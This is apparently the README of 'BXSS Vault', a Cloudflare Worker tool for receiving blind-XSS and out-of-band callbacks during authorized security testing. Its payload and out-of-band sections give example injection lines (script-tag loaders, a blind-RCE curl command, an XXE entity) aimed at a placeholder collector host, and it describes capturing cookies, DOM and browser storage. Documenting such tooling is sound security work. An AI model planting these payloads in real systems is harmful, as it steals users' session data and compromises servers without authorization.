# BXSS Vault

BXSS Vault is a clean-room, Cloudflare-native blind-XSS callback manager
inspired by [Truffle Security's MIT-licensed XSSHunter](https://github.com/trufflesecurity/xsshunter).
It is intended only for systems you own or are explicitly authorized to test.

It preserves the useful workflow—per-collector payload URLs, callback reports,
screenshots, DOM/cookie capture, optional same-origin page collection, and
correlated injection requests—without carrying over the upstream server,
storage, or authentication design.

## Security properties

- Passkey-only authentication with user verification required; no passwords.
- One-time, secret-gated owner bootstrap and no public registration.
- Fifteen-minute idle sessions, four-hour absolute sessions, immediate logout,
  CSRF synchronizer tokens, exact-origin checks, and user-agent binding.
- Fresh passkey verification for sensitive details, screenshots, deletion,
  collector-token rotation, recovery-code rotation, and passkey changes.
- Single-use recovery codes that only authorize enrolling a replacement
  passkey; recovery revokes every prior session.
- Optional Cloudflare Access JWT verification in front of the console for a
  second independent identity/MFA gate.
- AES-256-GCM application-level encryption for captured data and private R2
  objects, in addition to Cloudflare's storage encryption.
- Private screenshots streamed only through an ownership-checked endpoint.
- Strict CSP, no third-party console assets, no HTML rendering, and no use of
  React escape hatches for captured content.
- Cryptographically random collector/API/session identifiers, layered rate
  limits, body caps, daily event caps, and an atomic storage-byte quota.
- Metadata-only audit records; captured data is never intentionally logged.
- Five-minute scheduled retention sweeps that remove expired encrypted R2
  objects, D1 event rows, stale sessions, challenges, and unmatched requests.
- Collector-bound, HMAC-authenticated runtime URLs; unsigned or modified probe
  configuration is not served.
- Integrated out-of-band (OOB) HTTP interaction server for blind SSRF, RCE, XXE,
  and callback testing, sharing the same encryption, quotas, retention, and
  notifications; its endpoint returns one uniform inert response and never
  reflects input.

Read [SECURITY.md](./SECURITY.md) before placing real data in the vault.

## Cloudflare services

The project uses a single Worker with Workers Static Assets, D1, a private R2
bucket, and two Workers Rate Limiting bindings. Wrangler 4 automatically
provisions the D1/R2 resources declared in `wrangler.jsonc` on first deploy.

Current free-tier headroom is intentionally enforced by default:

- at most 5,000 accepted captures per UTC day;
- at most 2 MiB per callback;
- at most 7.5 GiB of encrypted R2 objects;
- two R2 writes at most per accepted event.

The configuration intentionally omits Wrangler's `limits.cpu_ms` field.
Custom execution limits require the Standard Usage Model; Workers Free applies
its fixed platform CPU limit automatically.

These guardrails keep ordinary modest usage inside the included R2 allowance,
but they cannot promise availability during a distributed attack. R2 usage
above its included tier is billable and Cloudflare budget alerts are not hard
caps. Cloudflare Free also has no mission-critical SLA.

## Requirements

- Node.js 22.12 or newer
- A Cloudflare account with Workers enabled
- Wrangler authentication (`npx wrangler login`)
- A WebAuthn-capable browser and preferably two hardware security keys

## First deployment

```powershell
npm install
npm run deploy:secure
```

`deploy:secure` generates three 256-bit secrets, displays a recovery bundle,
requires you to confirm that it is backed up, runs type-checking and the test
suite, creates a clean production build, runs Wrangler's deployment dry-run,
deploys it, and applies D1 migrations. Its temporary secrets file is deleted
in a `finally` block.

For critical use, do **not** bootstrap on the temporary `workers.dev` hostname.
First configure the final hostnames and Cloudflare Access as described below,
set `APP_ORIGIN`, `RP_ID`, and `COLLECTOR_ORIGIN`, and redeploy. Then open the
final console hostname, enter the displayed `BOOTSTRAP_TOKEN`, register the
owner passkey, and save the eight one-time recovery codes. Then:

1. Add a second passkey from **Security**.
2. Confirm that event details require a fresh passkey check.
3. Copy the collector payload from **Payloads**.
4. Run a synthetic authorized callback before using it on a real assessment.

## Payloads, short URLs, and callback parameters

Create additional independent payloads with **Payloads â†’ New payload**. Each
payload has its own random collector token, capture policy, rotation boundary,
and optional revocable short alias.

The dashboard can issue a compact loader such as:

```text
https://collector.example.com/a/22_CHARACTER_ALIAS.js
```

Rotating or revoking the alias immediately disables its loader, signed runtime,
and callback capability without changing the collector's full token.

Add placement metadata directly to either loader URL:

```text
https://collector.example.com/a/22_CHARACTER_ALIAS.js?url=checkout-form&aa&tag=production
```

Query order, duplicate keys, and bare flags such as `aa` are preserved. The
Worker normalizes and bounds the metadata, signs it into the callback URL,
verifies it before storage, encrypts it with the capture, and renders it as
inert text in **Payload parameters**. Limits are 16 parameters, 96 UTF-8 bytes
per name, 384 UTF-8 bytes per value, and 1 KiB for the canonical metadata JSON.
An over-limit loader is rejected instead of silently dropping metadata. The
dashboard applies the same all-or-nothing limits while generating snippets and
does not produce a snippet for empty names or malformed percent encoding.

Future releases preserve the configured Worker secrets:

```powershell
npm run deploy
```

## Recommended production hostnames

Use separate hostnames even though both route to the same Worker:

- `console.example.com` — dashboard and admin APIs
- `collector.example.com` — payload and callback paths

Set these non-secret variables in `wrangler.jsonc` under `vars`:

```jsonc
"APP_ORIGIN": "https://console.example.com",
"RP_ID": "console.example.com",
"COLLECTOR_ORIGIN": "https://collector.example.com"
```

Do this before registering production passkeys. A passkey is cryptographically
bound to `RP_ID`.

Create a Cloudflare Access self-hosted application for the entire console
hostname, allow only exact administrator identities, and require WebAuthn MFA.
Then add:

```jsonc
"CF_ACCESS_TEAM_DOMAIN": "https://your-team.cloudflareaccess.com",
"CF_ACCESS_AUD": "your-access-application-audience-tag"
```

The Worker validates the Access JWT signature, issuer, audience, expiry, and
algorithm on every non-collector request. Do not enable Access over the public
collector hostname/path or callbacks will fail.

After custom domains work, disable unnecessary `workers.dev` and preview URLs
in **Workers & Pages → Settings → Domains & Routes** so alternate hostnames do
not bypass your routing assumptions.

The repository disables version preview URLs by default. Set
`"workers_dev": false` in `wrangler.jsonc` after the custom hostnames are live.

## Notifications

Discord notifications are optional and metadata-only. They contain the event
ID, collector name, and receipt time. URLs, cookies, DOM, local/session storage,
screenshots, network details, secrets, payload parameters, and correlated
requests never leave the vault.

Store the webhook as a Cloudflare secret; do not paste it into source,
`wrangler.jsonc`, D1, or the dashboard:

```powershell
npx wrangler secret put DISCORD_WEBHOOK_URL
```

Enter a canonical `https://discord.com/api/webhooks/...` URL at Wrangler's
hidden prompt. Deploy the current code, open **Payloads**, enable Discord for
the desired collector, save its policy, and use **Send test**. Delivery starts
only after encrypted event storage succeeds and runs in the Worker's background
execution context so Discord latency does not delay the blind callback.

The browser-storage policy is also per collector and off by default. When
enabled, the probe collects bounded `localStorage` and `sessionStorage`
key/value pairs from the current origin. Those values are accepted only through
the size-limited capture schema, encrypted in the R2 event detail, and rendered
as inert text in the dashboard.

New collectors also leave screenshots and exposure checks off by default so a
basic proof-of-concept callback runs immediately after DOM readiness without
waiting for the window `load` event or a browser renderer. Same-origin page
collection and exposure checks run concurrently when explicitly enabled;
enable screenshots only when the engagement needs visual evidence.

## Plaintext migration export and deletion

The **Events** page can stream a TAR migration archive directly to a local file
in current Chromium-based browsers. Export requires a fresh passkey assertion
and includes a manifest, collector settings and tokens, every decrypted event
JSON record, raw validated JPEG/PNG screenshots, correlated requests, and
paginated matched or unmatched injection requests and audit records. Decrypted
archives are never written back to R2. Passkeys are RP-bound and API token
plaintext is intentionally unrecoverable, so issue new credentials at the
destination rather than attempting to migrate them.

The archive is intentionally plaintext for portability. Save it only to an
encrypted volume or immediately place it in an authenticated encrypted archive;
delete unencrypted copies after verifying the migration. Treat collector tokens
inside the manifest as credentials and rotate them after the move.

Single-capture deletion remains available in the detail drawer. The admin API
also supports ownership-scoped deletion of up to 20 selected event UUIDs per
request, while **Delete all** drains bounded batches after exact typed
confirmation. Both paths require same-origin CSRF validation and a fresh
passkey assertion, and remove private R2 objects before their D1 indexes.

## Local development

```powershell
npm install
npm run dev:init
npm run db:migrate:local
npm run dev
```

`dev:init` creates a git-ignored `.dev.vars` and prints the local bootstrap
token. Wrangler's local D1 and R2 data remains under `.wrangler/`.

## Payloads and correlation

The dashboard provides a normal loader URL:

```html
<script src="https://collector.example.com/p/COLLECTOR_TOKEN.js"></script>
```

Add an injection key to correlate a fire with the exact request that inserted
the payload:

```html
<script src="https://collector.example.com/p/COLLECTOR_TOKEN/INJECTION_KEY.js"></script>
```

Create an injection API token in **Security**, then register the originating
request before or after injection:

```powershell
$headers = @{ Authorization = "Bearer YOUR_API_TOKEN" }
$body = @{
  collectorId = "COLLECTOR_UUID"
  injectionKey = "INJECTION_KEY"
  request = "POST /authorized-target HTTP/1.1`n..."
} | ConvertTo-Json

Invoke-RestMethod -Method Post `
  -Uri "https://collector.example.com/ingest/injections" `
  -Headers $headers -ContentType "application/json" -Body $body
```

Collector tokens are public write capabilities because they appear in payload
source. They never authorize reads. Rotate one immediately if it is abused.

## Out-of-band interaction server

Blind vulnerabilities such as SSRF, blind command injection, XXE, and
template/JNDI callbacks are often proven out of band: the target *server* (not a
browser) reaches a URL you control. The **OOB** page issues listeners for this.

Each listener has its own DNS- and path-safe token (128-bit, lowercase base32)
and two callback forms:

```text
https://collector.example.com/o/COLLECTOR_26CHAR_TOKEN
COLLECTOR_26CHAR_TOKEN.oob.example.com   (optional, see below)
```

Any HTTP method and any path or query under the token is captured. Place the URL
wherever a blind payload can trigger a server-side fetch, for example:

```text
curl https://collector.example.com/o/COLLECTOR_26CHAR_TOKEN/blind-rce
<!ENTITY xxe SYSTEM "https://collector.example.com/o/COLLECTOR_26CHAR_TOKEN">
```

The Worker records the method, host, path, query, request headers, and a bounded
request body together with the Cloudflare-derived source IP, country, and colo.
Everything is encrypted with AES-256-GCM, charged against the same R2 storage
budget and daily cap as blind-XSS captures, swept by the same retention cron, and
viewable in the dashboard rendered as inert text. Optional Discord delivery is
metadata-only (listener name, interaction ID, HTTP method, receipt time).

The endpoint always answers with one short, fixed, non-reflecting response and
permissive CORS so browser-driven callbacks and their preflights also complete.
Unknown, disabled, and rate-limited tokens are indistinguishable from active
ones, so the endpoint cannot be used to enumerate listeners. Rotating a listener
token immediately disables its old callback URLs.

### Bare-hostname (wildcard) capture

Path callbacks work out of the box. Some payloads can only specify a hostname.
To also capture `TOKEN.oob.example.com`, pick a dedicated host, point a wildcard
at this Worker (a `*.oob.example.com` custom hostname/route and matching DNS),
and set:

```jsonc
"OOB_WILDCARD_HOST": "oob.example.com"
```

Only the immediate leftmost label is treated as the token. Do not place the
wildcard host behind Cloudflare Access or callbacks will fail. This server is
HTTP(S) only; capturing DNS-only interactions needs an authoritative nameserver,
which a Worker cannot provide.

## Backups and key loss

Back up `DATA_ENCRYPTION_KEY` and `AUTH_PEPPER` offline. D1/R2 backups without
`DATA_ENCRYPTION_KEY` are intentionally unreadable. Changing that key does not
re-encrypt existing objects. Losing it is permanent data loss.

D1 Time Travel retains Free-plan history for a limited period, so deletion is
not immediate physical erasure from platform backups. Keep retention short and
do not promise instant forensic erasure.

## Verification

```powershell
npm run typecheck
npm test
npm run build
npm run release:check
```

The deployment is not considered ready until all three succeed and a local
synthetic callback can be opened, step-up authenticated, and deleted.

## Attribution

This is a clean-room implementation and does not copy the upstream Vue UI or
embedded probe bundle. XSSHunter is Copyright (c) 2021 Matthew Bryant and is
available under the MIT License. `html2canvas` and the other npm dependencies
retain their own licenses in the installed dependency tree and generated legal
notice file.
